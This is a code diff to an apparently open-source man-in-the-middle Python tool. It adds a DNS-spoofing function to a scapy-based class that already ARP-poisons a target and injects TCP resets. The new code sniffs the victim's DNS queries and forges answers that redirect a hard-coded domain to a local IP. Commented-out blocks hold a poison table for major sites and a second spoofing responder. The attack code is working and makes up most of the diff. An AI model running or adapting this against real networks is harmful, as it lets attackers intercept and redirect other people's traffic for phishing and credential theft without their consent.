@@ -22,16 +22,20 @@ import logging as log
 from socket import socket, inet_ntoa, gethostbyname, PF_PACKET, SOCK_RAW
 from threading import Thread
 try:
-    from scapy.all import ARP, send, conf, sniff, TCP
+    from scapy.all import ARP, send, conf, sniff, TCP, UDP, DNS, DNSQR, IP, sr1, DNSRR, Ether
     conf.verb = 0
 except ImportError:
-    print("[!] Missing module scapy, try setting SCAPY to False in config.py"
+    print("[!] Missing module scapy, try setting SCAPY to False in config.py "
           "or install missing module")
 try:
     import pcap
+except ImportError:
+    print("[!] Missing modules pcap, try setting SCAPY to True in config.py "
+          "or install missing modules")
+try:
     import dpkt
 except ImportError:
-    print("[!] Missing modules pcap or dpkt, try setting SCAPY to True in config.py"
+    print("[!] Missing modules dpkt, try setting SCAPY to True in config.py "
           "or install missing modules")
 try:
     import dnet
@@ -412,6 +416,90 @@ class ScapyMitm(Mitm):
               timeout=10,
               count=0,
               prn=self._send_rst)
+
+    def dns_spoof(self, host=None, redirection=None):
+        pcap_filter = self._build_pcap_filter('udp dst port 53 and src ')
+        redirection = gethostbyname(redirection)
+
+        # redirect domain to the special ip
+        posion_table = {'search.yahoo.com': '192.168.1.107',
+                        'www.google.com': '192.168.1.108',
+                        'www.microsoft.com': '192.168.1.109'}
+
+        src_mac = self.src_mac
+        dst_mac = utils.get_mac_by_ip_s(self.target, 2)
+
+        def dns_poison(pkt):
+            """
+            posion dns request, search.yahoo.com and www.google.com will be 192.168.1.108
+            parse dns request / response packet
+            """
+            if pkt and pkt.haslayer('UDP') and pkt.haslayer('DNS'):
+                ip = pkt['IP']
+                udp = pkt['UDP']
+                dns = pkt['DNS']
+
+                # dns query packet
+                if int(udp.dport) == 53:
+                    qname = dns.qd.qname
+                    domain = qname[:-1]
+
+                    print("\n[*] request: %s:%d -> %s:%d : %s" % (ip.src, udp.sport, ip.dst, udp.dport, qname))
+
+                    # match posion domain (demo, maybe not explicit)
+                    # if domain.lower() in (posion_table.keys()):
+                    if b"staseraintv.com" in domain.lower():
+                        print("ok")
+                        # posion_ip = posion_table[domain]
+                        posion_ip = '192.168.1.107'
+
+                        pkt_eth = Ether(src=src_mac, dst=dst_mac)
+                        # send a response packet to (dns request src host)
+                        pkt_ip = IP(src=ip.dst,
+                                    dst=ip.src)
+
+                        pkt_udp = UDP(sport=udp.dport, dport=udp.sport)
+
+                        # if id is 0 (default value) ;; Warning: ID mismatch
+                        pkt_dns = DNS(id=dns.id,
+                                      qr=1,
+                                      qd=dns.qd,
+                                      an=DNSRR(rrname=qname, rdata=posion_ip))
+
+                        print("[*] response: %s:%s <- %s:%d : %s - %s" % (
+                            pkt_ip.dst, pkt_udp.dport,
+                            pkt_ip.src, pkt_udp.sport,
+                            pkt_dns['DNS'].an.rrname,
+                            pkt_dns['DNS'].an.rdata))
+
+                        send(pkt_ip/pkt_udp/pkt_dns)
+        # def DNS_Responder():
+        #     def forwardDNS(orig_pkt):
+        #         print("Forwarding: " + str(orig_pkt[DNSQR].qname))
+        #         response = sr1(IP(dst="8.8.8.8")/UDP(sport=orig_pkt[UDP].sport)/\
+        #                        DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)),verbose=0)
+        #         respPkt = IP(dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
+        #         respPkt[DNS] = response[DNS]
+        #         send(respPkt,verbose=0)
+        #         return("Responding: " + respPkt.summary())
+
+        #     def getResponse(pkt):
+        #         if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
+        #             if 'trailers.apple.com' in str(pkt['DNS Question Record'].qname):
+        #                 spfResp = IP(dst=pkt[IP].src)\
+        #                                   /UDP(dport=pkt[UDP].sport, sport=53)\
+        #                                   /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname)\
+        #                                        /DNSRR(rrname="trailers.apple.com"))
+        #                 send(spfResp,verbose=0)
+        #                 return "Spoofed DNS Response Sent"
+
+        #             else:
+        #                 #make DNS query, capturing the answer and send the answer
+        #                 return forwardDNS(pkt)
+        #         else:
+        #             return False
+        #     return getResponse
+        sniff(filter=pcap_filter, prn=dns_poison)
 
     def poison(self, delay):
         if not isinstance(self.target, list):
